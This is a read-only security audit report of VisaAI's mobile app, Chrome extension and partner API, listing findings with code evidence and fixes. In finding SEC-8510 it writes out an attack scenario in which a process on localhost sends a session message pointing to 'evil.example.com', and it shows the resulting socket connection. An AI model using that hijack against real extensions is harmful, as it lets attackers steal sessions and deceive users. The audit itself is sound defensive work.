# VisaAI Wave 1 Security Audit — Client & Partner Surfaces

Scope: `apps/mobile`, `apps/extension`, `apps/sidecar`, `packages/partner-sdk` + `apps/api/src/modules/partner/**`. Read-only reconnaissance. No files edited. Finding IDs SEC-8501–SEC-8999.

Audit date: 2026-08-16.

---

## Surface status summary

**apps/mobile** — SHIPPED (code-complete, not yet store-released per repo `CLAUDE.md`: "code-complete, not shipped"). A real Expo/React Native app (`expo` ~SDK 55, New Architecture only) with four env-scoped build variants (development/test/staging/production, distinct bundle IDs `co.visaai.app[.dev|.test|.staging]`), Supabase auth, expo-secure-store, expo-local-authentication (Face ID/biometric unlock), expo-screen-capture, Sentry crash reporting, and verified universal/app links into `/applications`, `/my-applications`, `/messages`, `/invite`, `/reset-password`. This is a live, actively engineered surface, not a stub.

**apps/extension** — SHIPPED. Manifest V3 Chrome extension ("VisaAI Portal Assistant", v0.1.2) that assists filling Canadian government immigration portal forms (`*.cic.gc.ca`, `*.canada.ca`). Its own manifest description states "You always complete payment and submission" — i.e. it is explicitly scoped to autofill only, not autonomous submission. `host_permissions` and `content_scripts.matches` are narrowly scoped to the two government domains (not `<all_urls>`). `externally_connectable` allows messaging from `visaai.co`/`*.visaai.co` and `http://localhost:3000` (dev origin left in the shipped manifest — see findings).

**apps/sidecar** — DEAD / REMOVED. Confirmed via `git show --stat 369607e` ("Gate VRI by plan tier and simplify submission to Chrome extension only", 2026-06-02): this commit deleted `apps/sidecar/package.json`, `src/main.ts`, `src/preload.ts`, `src/renderer.ts`, `src/automation-driver.ts`, `tsconfig.json` and the associated automation-gateway handshake code, replacing the Electron-sidecar submission path entirely with the Chrome extension. The repo's own root `CLAUDE.md` confirms: *"The Electron `sidecar/` app was removed in `369607e` (2026-06-02)... Do not reintroduce references to it."* Today `apps/sidecar/` on disk contains only a stale, **untracked** `node_modules/` directory (`git status apps/sidecar` → clean working tree) — no source, no package.json, nothing that binds a port or accepts a connection. There is no live local sidecar service to audit. No findings raised against this surface.

**packages/partner-sdk** — SHIPPED. `@visaai/partner-sdk` (v0.1.0), "Official TypeScript client for the VisaAI Partner API," published for third-party partner integration. A plain Node/TS `fetch`-based client (`client.ts`) plus a webhook-signature-verification helper (`webhooks.ts`). No README/docs bundled in the package and nothing in `src/` instructs a partner to embed the key client-side — the constructor takes `apiKey` as an opaque server-side option. Backed by `apps/api/src/modules/partner/**` (partner-portal.controller.ts, partner-registry.service.ts, partner-auth.guard.ts) — an active, previously-audited module (repo history shows a P0 tenancy-check fix landed in this exact module on 2026-08-16, same day as this audit; verified below).

---

## Severity summary

| Severity | Count |
|---|---|
| CRITICAL | 0 |
| HIGH | 1 |
| MEDIUM | 1 |
| LOW | 3 |
| INFO | 3 |

---

## apps/mobile — findings

**Also checked and confirmed safe** (so the absence of findings below isn't silence): secrets handling (`src/config/env.ts` reads only designed-public `EXPO_PUBLIC_*` values; `assertTransportSecurity()` throws at startup on any non-`https://` prod URL; zero hardcoded key patterns found in `src/`/`app/`/`eas.json`/`app.config.ts`); session/token storage (Supabase session persisted via a chunked `expo-secure-store` adapter, `WHEN_UNLOCKED_THIS_DEVICE_ONLY`, excluded from iCloud/device backup — `src/storage/secure-store.ts:34`, wired at `src/auth/supabase.ts:27`); transport (`NSAllowsArbitraryLoads: false`, no Android cleartext override); permissions (least-privilege — camera/biometric/notifications/network only, `RECORD_AUDIO` and `SYSTEM_ALERT_WINDOW` actively stripped via `blockedPermissions`); deep links (`src/notifications/routing.ts` allowlists UUID-only params, unknown paths fall back to dashboard, and the API re-checks ownership server-side regardless of what the link claimed); document upload (bytes go device→Supabase Storage directly via short-lived signed URL, API never proxies/buffers a scan); PII/token logging (no `console.*` touching tokens/PII found in `src/`); screen-capture protection (`FLAG_SECURE`/iOS blur wired app-wide at `app/_layout.tsx:127`); payments (Stripe Checkout/Portal opened via system browser, return URL never trusted as proof of payment — `src/payments/checkout.ts:14-20`).

### SEC-8501
Title: Uploaded document temp files are not cleaned up on failed/errored uploads
Severity: MEDIUM
Affected component: apps/mobile
Affected profile(s): Any applicant uploading identity/immigration documents from the mobile app
Affected page/API: `apps/mobile/src/documents/upload.ts` (`uploadDocument`)
Description: The document upload pipeline copies a picked/captured passport or supporting-document image into the app's cache directory, then is supposed to delete it once storage owns the bytes. `deleteLocalCopy()` is called only on the success path (line 143) and the explicit user-cancel path (line 163). Every other failure exit — a failed presign request, `uploadTask.uploadAsync()` throwing a non-cancel error (line 121, bare `throw err`), or `documentsApi.register()` failing after the storage PUT already succeeded — leaves the temp copy of the document sitting in the device cache with no cleanup on next launch and no TTL sweep anywhere in the codebase (confirmed: `deleteLocalCopy` has no other call sites in `src/`). This directly contradicts the file's own stated security requirement.
Attack scenario: A user on a flaky connection has a presign call or a post-upload `register()` call fail (network blip, 5xx, app backgrounded mid-request). The passport/document scan copy silently persists in the app's cache directory indefinitely — readable by anything with access to app-sandbox storage (device forensics, a malicious app exploiting a separate sandbox-escape bug, or a shared/jailbroken device), and eligible to be swept into a device backup if `allowBackup` is ever left enabled (see SEC-8502) or on iOS if the cache directory is ever miscategorized.
Business impact: Immigration documents (passport photos, proof-of-funds letters, etc.) accumulate outside the encrypted, access-controlled storage path the design explicitly calls for, undermining the app's own stated data-minimization guarantee for a regulated, high-sensitivity document type.
Evidence:
`apps/mobile/src/documents/upload.ts:17-19`
```
 * Local copies: the picker writes a temporary file into the app cache. We delete
 * it after a successful upload. Immigration documents must not accumulate in a
 * cache directory that survives sign-out or lands in a device backup.
```
`apps/mobile/src/documents/upload.ts:112-123` (failure re-thrown with no cleanup)
```
    let result;
    try {
      result = await uploadTask.uploadAsync();
    } catch (err) {
      // The native task REJECTS on cancel; without this it fell through as an
      // unknown error and was retried.
      if (cancelled) {
        throw new ApiError({ kind: 'cancelled', status: 0, message: 'Upload cancelled' });
      }
      throw err;
    }
```
`apps/mobile/src/documents/upload.ts:135-143` (cleanup only reachable after `register()` succeeds)
```
    const document = await documentsApi.register(request.applicationId, {
      storagePath: presign.storagePath,
      mimeType: validation.mimeType,
      fileName: validation.fileName,
      checklistItemId: request.checklistItemId,
    });

    // Drop the picker's temp copy now that storage owns the bytes.
    await deleteLocalCopy(request.uri);
```
Root cause: Cleanup is placed only on the two paths the author explicitly anticipated (success, explicit cancel) rather than in a `finally`/try-wrapper covering every exit, and there is no periodic cache sweep as a second line of defense.
Remediation: Wrap the upload body in a `try/finally` (or equivalent) that calls `deleteLocalCopy(request.uri)` on every exit path except the ones where the file is deliberately still needed for a retry the caller controls; alternatively, add a startup/foreground sweep that purges any file in the app cache directory matching the document-picker naming pattern older than a short TTL (e.g., 24h), as defense in depth against any future missed-cleanup path.
Suggested regression test: Unit test that mocks `documentsApi.presign` to resolve and `uploadTask.uploadAsync` to reject with a non-cancel error, then asserts `deleteLocalCopy`/the file-deletion mock was still invoked. Repeat with `documentsApi.register` mocked to reject after a successful `uploadAsync`.
Confidence: CONFIRMED

### SEC-8502
Title: `android:allowBackup` not explicitly disabled for an app holding immigration documents and tokens
Severity: LOW
Affected component: apps/mobile
Affected profile(s): Android users
Affected page/API: `apps/mobile/app.config.ts` (Android config block)
Description: The Android config block sets permissions, adaptive icon, and intent filters, but never sets `allowBackup: false`, so the Expo/AOSP default (`allowBackup: true`) ships. Impact is bounded — the app deliberately keeps its most sensitive data (session tokens, offline mutation queue, drafts) out of `AsyncStorage` and in SecureStore/Keystore-backed storage, which itself is excluded from Android Auto Backup — but any non-sensitive `AsyncStorage` state (push token, locale/i18n preference, analytics anonymous ID) or third-party SQLite caches remain eligible for backup/restore to a new device or Google account.
Attack scenario: Low — would require a threat that can already read a user's Google Account backup (a much larger compromise than this app), at which point the exposed material is limited to non-secret preference data given the SecureStore design elsewhere in the app.
Business impact: Defense-in-depth gap only; no direct path to token or document exposure was identified given the app's existing SecureStore-first design.
Evidence: `apps/mobile/app.config.ts:97-128` (Android block, no `allowBackup` key present anywhere in the file — confirmed by full-file read).
Root cause: Omission; Expo's default was not overridden.
Remediation: Add `android: { allowBackup: false, ... }` (or a `fullBackupContent` XML restricting what's included) alongside the existing permissions block.
Suggested regression test: Assert in a config test / `expo prebuild` CI check that the generated `AndroidManifest.xml` contains `android:allowBackup="false"`.
Confidence: CONFIRMED

### SEC-8503
Title: OAuth redirect-handling code referenced in comments does not exist — not a live attack surface yet, but PKCE re-verification is owed when it ships
Severity: INFO
Affected component: apps/mobile
Affected profile(s): Future social-login users (not currently reachable — feature not implemented)
Affected page/API: `apps/mobile/src/auth/supabase.ts`
Description: `src/auth/supabase.ts:16-17` documents that "OAuth returns through the app scheme and is exchanged explicitly in `src/auth/oauth.ts`," but no such file exists anywhere in the tree, and no `Linking`/`WebBrowser`-based OAuth-redirect handler was found outside the (unrelated) password-reset and payment-checkout flows. Social-login OAuth is not actually implemented, despite the Supabase client being pre-configured with `flowType: 'pkce'`. This means the classically hijackable surface this audit was asked to check — "is the custom URL scheme for OAuth redirect guessable/hijackable by another app registering the same scheme?" — currently has no code path to exploit.
Attack scenario: None today. Recorded so that when OAuth is actually built, the implementation is reviewed for exactly this (custom-scheme redirect hijacking, PKCE code-verifier handling) rather than assumed already-shipped and safe because a comment says so.
Business impact: None currently; documentation/implementation drift risk for whoever picks this up next.
Evidence: `apps/mobile/src/auth/supabase.ts:16-17`
```
 *  - detectSessionInUrl: false — there is no URL bar; OAuth returns through the
 *    app scheme and is exchanged explicitly in src/auth/oauth.ts;
```
and absence confirmed via repo-wide search for `oauth.ts` and OAuth-redirect `Linking`/`WebBrowser` handlers outside `reset-password.tsx`/`checkout.ts`.
Root cause: Comment written ahead of implementation; feature not yet built.
Remediation: Either remove/flag the comment as aspirational until built, or build `src/auth/oauth.ts` and have it reviewed specifically for scheme-hijack and PKCE-verifier handling before ship.
Suggested regression test: N/A until implemented — add one covering "app receives a redirect on the custom scheme from an unexpected source" once the handler exists.
Confidence: CONFIRMED (file absence + no dead references found)

---

## apps/extension — findings

**Also checked and confirmed safe**: `host_permissions` (`manifest.json:8`) scoped to `https://*.cic.gc.ca/*` and `https://*.canada.ca/*` only — not `<all_urls>`; `content_scripts.matches` (`manifest.json:20-25`) mirrors the same scope, so the DOM-write-capable content script cannot run on arbitrary pages; no `content_security_policy` override → MV3 default CSP applies (no remote code, no `eval`; repo-wide grep for `eval(`, `new Function(`, `importScripts` in `apps/extension/src` returned zero hits); no `web_accessible_resources` declared; internal message routing (`background.ts:71-105`, handling `pf-bind-session`/`pf-execute-field`/`execute-step`) is `chrome.runtime.onMessage`, which is not reachable from arbitrary web-page JS — confirmed no `window.postMessage`/`addEventListener('message'` bridge exists anywhere in `apps/extension/src` (zero grep hits), so a compromised government-portal page cannot relay into a privileged channel; the one live DOM-write path (`pf-execute-field` → `content.ts` → `field-executor.ts` → `safety-guards.ts:13-24`) is fail-closed and rejects `submit`/`button`/`image`/`reset`/`file`/`password` targets and disabled/readonly controls, and never calls `.click()`/`.submit()`/navigates; the one `innerHTML` use in `preflight-panel.ts:85` passes all interpolated values through a correct `escapeHtml()` (lines 152-156) first.

### SEC-8510
Title: Production manifest trusts `http://localhost:3000` as a first-party origin for session/token handoff, with no destination allowlist on the resulting connection
Severity: HIGH
Affected component: apps/extension
Affected profile(s): Any user with the extension installed
Affected page/API: `apps/extension/manifest.json` (`externally_connectable`), `apps/extension/src/background.ts` (`onMessageExternal`), `apps/extension/src/sidepanel.ts` (`connect`)
Description: `externally_connectable.matches` in the shipped manifest includes `http://localhost:3000/*` unconditionally — `build.mjs` copies `manifest.json` verbatim into `dist/` with no environment branching between dev and production/Web-Store builds. Port 3000 is one of the most common local-dev ports in the ecosystem (Next.js, Create React App, etc.), so any unrelated local process or webpage that can bind/serve that port on the user's machine can call `chrome.runtime.sendMessage(EXTENSION_ID, {...})` and be treated by the extension exactly as if it were the real `visaai.co` web app. The `onMessageExternal` handler for `type: 'session'` performs no validation of `apiUrl` (no allowlist check against `api.visaai.co`/`*.visaai.co`) before persisting it and badging the toolbar "GO" to prompt the user to open the side panel. The side panel then auto-consumes the stored session and opens a `socket.io` WebSocket to the attacker-chosen `apiUrl` using the attacker-chosen `token`, badged inside the extension's real, trusted UI chrome.
Attack scenario: Malicious/compromised software bound to `localhost:3000` (or any other software able to satisfy that origin match, e.g. a dev tool left running, or an unrelated app that happens to use the same port) sends `{type:'session', token:'<attacker-token>', apiUrl:'https://evil.example.com'}` to the extension. The extension stores it and badges the icon "GO". If the user clicks the badge (a natural, expected interaction for this extension), the side panel opens and connects `io('https://evil.example.com/automation', {auth:{token:'<attacker-token>'}})`, then renders whatever `automation:plan` the attacker's server emits inside the extension's legitimate-looking side panel UI, and attempts to dispatch each step to the active government-portal tab via `execute-step`.
Business impact: An attacker gets a legitimate-looking UI surface, branded as VisaAI and running inside the user's real installed extension, fully under their control — a strong platform for social-engineering the user (e.g., "steps" instructing risky manual actions) while the user reasonably believes they're interacting with VisaAI's own automation. The live consequence is currently bounded (see SEC-8511) but the trust-boundary design flaw is real and shipped to every user today.
Evidence:
`apps/extension/manifest.json:9-14`
```
  "externally_connectable": {
    "matches": [
      "http://localhost:3000/*",
      "https://*.visaai.co/*",
      "https://visaai.co/*"
    ]
  },
```
`apps/extension/src/background.ts:38-51` (no `apiUrl` allowlist before persisting/badging)
```
  if (msg.type === 'session') {
    if (!msg.token || !msg.apiUrl) {
      sendResponse({ ok: false, detail: 'token and apiUrl required' })
      return false
    }
    const pending: PendingSession = {
      token: msg.token,
      apiUrl: msg.apiUrl,
      portalUrl: msg.portalUrl,
      receivedAt: Date.now(),
    }
    void (async () => {
      try {
        await chrome.storage.local.set({ pendingSession: pending })
```
`apps/extension/src/sidepanel.ts:13-22, 35-42` (auto-connect to the stored, unvalidated `apiUrl`/`token`)
```
  const stored = await chrome.storage.local.get('pendingSession')
  const pending = stored.pendingSession as { token: string; apiUrl: string; receivedAt: number } | undefined
  if (pending && Date.now() - pending.receivedAt < PENDING_TTL_MS) {
    ...
    connect(pending.apiUrl, pending.token)
  }
...
function connect(apiUrl: string, token: string) {
  ...
  socket = io(`${apiUrl}/automation`, {
    transports: ['websocket'],
    auth: { token },
  })
```
Root cause: A local-dev convenience (`localhost:3000` in `externally_connectable`) was never gated out of production builds, and the handler that consumes messages from that origin trusts the caller-supplied destination host (`apiUrl`) instead of pinning it to VisaAI's own API origin.
Remediation: (1) Build-time strip `http://localhost:3000/*` from `externally_connectable` in production/Web-Store manifests (mirror the `APP_ENV` variant pattern already used in `apps/mobile/app.config.ts`), or gate it behind a build flag that's off for the shipped extension. (2) Independent of (1), allowlist `apiUrl` in the `session` handler against a fixed set of known-good API hosts (`api.visaai.co` and, if truly needed, a pinned staging host) before storing/using it — never trust a caller-supplied destination host for a socket connection carrying a bearer token. (3) Validate `sender.origin` explicitly inside the handler in addition to the manifest match, so the manifest isn't the only enforcement point.
Suggested regression test: Extension integration test asserting `onMessageExternal` rejects (or the resulting `connect()` refuses) a `session` message whose `apiUrl` is not in an explicit allowlist, even when the message arrives from an `externally_connectable`-matched origin.
Confidence: CONFIRMED

### SEC-8511
Title: Compensating control — the DOM-write endpoint reachable from SEC-8510 is currently dead code, bounding today's exploitability
Severity: INFO
Affected component: apps/extension
Affected profile(s): N/A — documents a mitigating factor, not a new issue
Affected page/API: `apps/extension/src/content.ts` (`execute-step` handler)
Description: The `execute-step` message type that an attacker-controlled `automation:plan` (via SEC-8510) would drive is explicitly disabled. This means SEC-8510 cannot currently be used to make the extension write into a government portal form — only to display attacker-controlled content inside the side panel and receive "step failed" responses. This is recorded so SEC-8510's remediation isn't deprioritized on the assumption that "nothing bad can happen" — it becomes live again the instant `execute-step` is re-enabled, or if the newer `pf-bind-session`/`pf-execute-field` pipeline is ever wired to consume the same unauthenticated `apiUrl` handoff without its own allowlist/signature check.
Attack scenario: N/A (mitigating factor).
Business impact: Bounds SEC-8510's blast radius today; does not reduce the priority of fixing SEC-8510.
Evidence: `apps/extension/src/content.ts:54-58`
```
if (msg.type === 'execute-step') {
  sendResponse({ ok: false, detail: 'LEGACY_EXECUTION_DEPRECATED' })
  return true
}
```
Root cause: N/A.
Remediation: N/A — track alongside SEC-8510; re-audit before ever re-enabling `execute-step` or wiring Phase 7I to an externally-sourced `apiUrl`.
Suggested regression test: A test asserting `execute-step` remains disabled (fails loudly if someone re-enables it without also fixing SEC-8510) would be a reasonable tripwire.
Confidence: CONFIRMED

### SEC-8512
Title: "Signed field intent" naming/comments overstate what's actually enforced (no signature field exists)
Severity: LOW
Affected component: apps/extension
Affected profile(s): N/A — internal-only channel today (see SEC-8511-adjacent context: not externally reachable)
Affected page/API: `apps/extension/src/shared.ts` (`PortalFillWriteCommand`), comments in `background.ts:124` and `content.ts:38`
Description: The Phase 7I write-command type is referred to in comments as a "signed field intent," but `PortalFillWriteCommand` carries no HMAC/signature/nonce field — only `executionId`, `fieldKey`, `selector`, `mappedValue`, `expectedValueHash`. Not exploitable today because this channel is only reachable via `chrome.runtime.onMessage` (internal-only, confirmed not bridged to web pages — see "confirmed safe" list above) and the server leg doesn't exist yet. Flagging now, before this pipeline is wired to a live server, so the eventual implementer doesn't assume cryptographic authenticity that was never built.
Attack scenario: None today; a future risk if the server-to-extension leg is built assuming "signed" means what it says.
Business impact: None today; prevents a false sense of security in a not-yet-shipped feature.
Evidence: `apps/extension/src/background.ts:124` — comment: "dispatch one signed intent to the BOUND tab's content script" against a `PortalFillWriteCommand` type with no signature field (`shared.ts`).
Root cause: Naming/comment written ahead of the field actually being implemented.
Remediation: Either implement an actual signature (e.g., HMAC over the command fields, keyed to the session) before this pipeline goes live with a real server leg, or rename away from "signed" until it is.
Suggested regression test: N/A until the server leg exists.
Confidence: CONFIRMED

---

## apps/sidecar

Dead code — removed 2026-06-02 in commit `369607e`. See surface-status summary above. No findings.

---

## packages/partner-sdk + apps/api/src/modules/partner — findings

**Also checked and confirmed safe/correct** (so the absence of MEDIUM+ findings isn't silence): key minting uses `crypto.randomBytes(32)` with only the SHA-256 hash persisted, plaintext returned exactly once (`partner-credentials.ts:45-57`); comparisons use `timingSafeEqual` with a length pre-check on fixed-length hex digests, both for API keys (`partner-credentials.ts:93-98`) and webhook signatures (`webhooks.ts:101-106`); credentials are accepted only via `Authorization: Bearer <token>` (`partner-auth.guard.ts:96-102`), no query-string path found anywhere in the v1/portal controllers; keys/tokens are scoped to one `application_id`/`partner_id` with scopes intersected down against the application on every request (`partner-auth.service.ts:90,137`) — no global/master key found; `revokeKey`/`suspendApplication` revoke tokens immediately with no cache lag (`revokeTokensForApplication`); rate limiting is per-application across three independent windows (minute/day/month) and runs inside the auth guard itself so it can't be bypassed pre-auth (`partner-rate-limit.ts`, `partner-auth.guard.ts:81-90`); an undeclared-scope route fails closed (`partner-auth.guard.ts:66-68`, quoted below); every partner-facing read (`getApplication`/`listApplications`/`listDocuments` in `partner-resources.service.ts`) resolves the true resource owner first and then checks consent — a client-supplied `user_id` can never override the token's bound subject, and `getApplication` returns a uniform 404 for both "not found" and "not consented" to avoid an existence oracle; response DTOs (`toApplicationView`/`toDocumentView`) are explicit allowlists, not `select('*')`, and exclude internal fields like `plan_tier`/`risk_indicators_json`/document `storage_path`; webhook registration validates against SSRF (private/loopback/link-local/CGNAT/multicast IPv4+IPv6, cloud-metadata hostnames) at registration time AND re-validates the actually-resolved address at delivery time via pinned DNS lookup, closing the DNS-rebinding gap; webhook payloads are HMAC-SHA256 signed with a 300s replay window; partner-portal mutations write to `auth_audit_log`.

**Suspend-endpoint fix (2026-08-16) — verified CURRENT and complete.** `partner-portal.controller.ts:170-189`, quoted below: `suspend` now parses the full `RevokeKeyDto` (`organizationId` required, not the trimmed subset that dropped it before the fix) and calls `suspendApplication(user.id, input.organizationId, id, input.reason)`. `suspendApplication` calls the same `requireApplicationAsAdmin(actingUserId, organizationId, applicationId)` tenancy-check helper used by `createKey`/`rotateKey`/`revokeKey`/`createApplication`. All five mutating application/key endpoints now consistently resolve the org from the DB and verify `application.partner_id === partner.id` before acting. No gap found in the current code.
```
  @Post('applications/:id/suspend')
  @RequirePermission('partner.manage')
  async suspend(
    @CurrentUser() user: AuthUser,
    @Param('id') id: string,
    @Body() body: unknown,
  ): Promise<PartnerApplication> {
    // Full RevokeKeyDto: organizationId is REQUIRED so the service can verify
    // the application actually belongs to the org the caller administers.
    const input = parse(RevokeKeyDto, body);
    return toApplicationDto(
      await this.registry.suspendApplication(
        user.id,
        input.organizationId,
        id,
        input.reason,
      ),
    );
  }
```

Fail-closed scope check, for reference (`partner-auth.guard.ts:65-68`):
```
    // Fail closed on an undeclared route. Forgetting the decorator must not
    // silently publish an endpoint to every credential on the platform.
    if (required.length === 0)
      throw PartnerErrors.insufficientScope('(undeclared)');
```

### SEC-8520
Title: `setStatus`/`approveApplication` lack a code-level tenancy check, relying entirely on a DB role grant as the only line of defense
Severity: LOW
Affected component: apps/api/src/modules/partner
Affected profile(s): Platform staff (`platform_admin`/`super_admin`) — NOT self-service `org_admin`
Affected page/API: `apps/api/src/modules/partner/partner-registry.service.ts` — `setStatus` (line 113) and `approveApplication` (line 240)
Description: Unlike every other mutating method in `partner-registry.service.ts` (`createApplication`, `suspendApplication`, `createKey`, `rotateKey`, `revokeKey` — all of which take `organizationId` and call `requireApplicationAsAdmin`/`requirePartnerAsAdmin`), `setStatus` and `approveApplication` take no `organizationId` argument and perform no tenancy check in the service layer. This is safe today only because the controller route(s) calling these methods require `partner.approve`, a permission granted exclusively to `platform_admin`/`super_admin` in `supabase/migrations/20260806000000_partner_api_platform.sql:499-506` — `org_admin` (the role any self-service organization creator auto-receives) is granted only `partner.read`/`partner.manage`, not `partner.approve`. So the class of user who could self-escalate into calling this (per the pattern that made the now-fixed suspend bug exploitable) does not have the permission to reach it. But that safety currently rests entirely on a DB grant staying correct, with zero code-level assertion as a second line of defense if the migration or a future permission grant ever changes.
Attack scenario: None today, given the current permission grants verified against the migration. Would become exploitable only if `partner.approve` (or a future permission gating these methods) is ever granted to a self-service-obtainable role such as `org_admin` — which is exactly the class of regression the now-fixed suspend bug (2026-08-16) demonstrates this codebase is not immune to.
Business impact: None today; a regression-prevention gap, not a live vulnerability.
Evidence: `apps/api/src/modules/partner/partner-registry.service.ts:113` (`setStatus` signature has no `organizationId`/tenancy check) and `:240` (`approveApplication`, same pattern) — contrast with every sibling mutating method, which does take `organizationId` and calls a `requireApplicationAsAdmin`/`requirePartnerAsAdmin` check. Permission grant confirmed at `supabase/migrations/20260806000000_partner_api_platform.sql:499-506`.
Root cause: These two methods were written for platform-staff-only call sites and inherited that assumption implicitly via the permission system rather than asserting it in code.
Remediation: Add the same `organizationId`-scoped tenancy assertion used by the other five mutating methods (even though, for platform-admin call sites, the assertion may reasonably differ — e.g. an explicit staff-role check rather than an org-ownership check), so a future permission-grant change can't silently reopen this the way the suspend endpoint was.
Suggested regression test: A test that grants `partner.approve` to a synthetic `org_admin`-equivalent principal and asserts `setStatus`/`approveApplication` still refuse to act outside a caller's own scope (should fail today without the code change, proving the current safety is grant-dependent).
Confidence: PLAUSIBLE (the code-level gap is CONFIRMED by reading the file; the "not currently exploitable" conclusion depends on the permission-grant migration being the actual, current, deployed state of prod RBAC, which was not independently re-verified against the live database in this read-only pass — only against the migration file in the repo).

---

## Notes on methodology

All findings above were produced by direct reading of the source files cited, cross-checked by a second read-only pass on the highest-severity items (extension `background.ts`/`sidepanel.ts`, mobile `upload.ts`/`app.config.ts`, partner `partner-portal.controller.ts`/`partner-auth.guard.ts`). No file in scope was modified. `apps/sidecar` was confirmed dead via `git show --stat 369607e` and `git status` (clean tree, untracked `node_modules/` only) rather than assumed dead from the CLAUDE.md note alone.

